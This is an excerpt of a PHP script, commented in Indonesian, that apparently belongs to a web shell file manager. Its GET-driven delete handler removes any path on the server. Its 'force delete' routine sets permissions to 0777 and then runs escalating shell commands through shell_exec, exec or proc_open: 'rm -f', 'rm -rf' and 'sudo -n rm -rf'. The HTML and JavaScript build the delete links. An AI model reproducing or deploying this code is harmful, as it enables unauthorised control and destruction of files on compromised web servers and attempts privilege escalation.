...
// ============ HANDLE CHDIR LEBIH AWAL AGAR KONSISTEN ============
...
// ============ MODIFIKASI DELETE: TETAP DI DIREKTORI SAMA + DELETE TAJAM ============
if (isset($_GET['del'])) {
    ...
    // Jika path relatif, jadikan absolut berdasarkan current directory
    if (strpos($fileToDelete, '/') !== 0) {
        $fileToDelete = rtrim($currentDirectory, '/') . '/' . ltrim($fileToDelete, '/');
    }
    
    // Tentukan direktori tujuan redirect (direktori asal file)
    $returnDir = dirname($fileToDelete);
    if (isset($_GET['lph'])) {
        $returnDir = urldecode($_GET['lph']);
        $returnDir = str_replace('\\', '/', $returnDir);
    }
    
    // Cek keberadaan file (file_exists menangani file & dir; is_link untuk symlink rusak)
    $exists = file_exists($fileToDelete) || is_link($fileToDelete);
    
    if ($exists) {
        $result = forceDelete($fileToDelete);
        if ($result) {
            $msg = 'deleted';
        } else {
            $msg = 'delete_failed';
    ...
    // Redirect kembali ke direktori asal
    $redirectUrl = $_SERVER['PHP_SELF'] . '?lph=' . urlencode($returnDir) . '&msg=' . $msg;
    header('Location: ' . $redirectUrl);
    exit;
}
// ============ END MODIFIKASI DELETE ============
...
// ============ MODIFIKASI DELETE: FUNGSI FORCE DELETE YANG LEBIH TAJAM ============
function forceDelete($path) {
    if (empty($path)) return false;
    
    $exists = file_exists($path) || is_link($path);
    if (!$exists) {
        return true; // sudah tidak ada = sukses
    }
    
    // Jika direktori, hapus rekursif
    ...
    // Layer 1: coba chmod + unlink biasa
    @chmod($path, 0777);
    ...
    // Layer 2: coba shell rm -f
    if (function_exists('shell_exec') || function_exists('exec') || function_exists('proc_open')) {
        $escaped = escapeshellarg($path);
        runCmd("chmod -R 0777 " . escapeshellarg(dirname($path)) . " 2>/dev/null; rm -f $escaped 2>&1");
        clearstatcache(true, $path);
        if (!file_exists($path) && !is_link($path)) return true;
    }
    
    // Layer 3: coba rm -rf (untuk kasus file dianggap direktori)
    if (function_exists('shell_exec') || function_exists('exec') || function_exists('proc_open')) {
        $escaped = escapeshellarg($path);
        runCmd("rm -rf $escaped 2>&1");
        clearstatcache(true, $path);
        if (!file_exists($path) && !is_link($path)) return true;
    }
    
    // Layer 4: coba sudo (jika ada)
    if (function_exists('shell_exec') || function_exists('exec') || function_exists('proc_open')) {
        $escaped = escapeshellarg($path);
        runCmd("sudo -n rm -rf $escaped 2>/dev/null");
        clearstatcache(true, $path);
        if (!file_exists($path) && !is_link($path)) return true;
    }
    
    // Layer 5: unlink terakhir
    clearstatcache(true, $path);
    @unlink($path);
    clearstatcache(true, $path);
...
function deleteFolder($folder) {
    ...
    // Fallback shell rm -rf
    if (function_exists('shell_exec') || function_exists('exec') || function_exists('proc_open')) {
        $escaped = escapeshellarg($folder);
        runCmd("rm -rf $escaped 2>&1");
        clearstatcache(true, $folder);
        if (!is_dir($folder)) return true;
    }
...
// chdir sudah dilakukan di atas, tinggal refresh currentDirectory
$currentDirectory = realpath(getcwd());
if ($currentDirectory === false) $currentDirectory = getcwd();
...
if (isset($_GET['msg']) && $_GET['msg'] === 'not_found') {
    $errorMessage = '❌ File not found (mungkin sudah terhapus).';
}
                ...
                <tr>
                    ...
                    <td style="text-align:right;">
                        <div class="action-btns">
                            ...
                            <a href="javascript:void(0)" class="act-del" onclick="showDeleteConfirm('<?php echo urlencode($fullPath); ?>','<?php echo htmlspecialchars($fd['name']); ?>','<?php echo urlencode($currentDirectory); ?>')">🗑</a>
                        </div>
                    </td>
                </tr>
                <?php endforeach; else: ?>
...
function showDeleteConfirm(path, name, currentDir) {
    document.getElementById('deleteFileName').textContent = decodeURIComponent(name);
    // Bangun URL delete dengan path dan lph (direktori asal)
    var delUrl = '?del=' + path + '&lph=' + currentDir;
    document.getElementById('deleteConfirmBtn').href = delUrl;
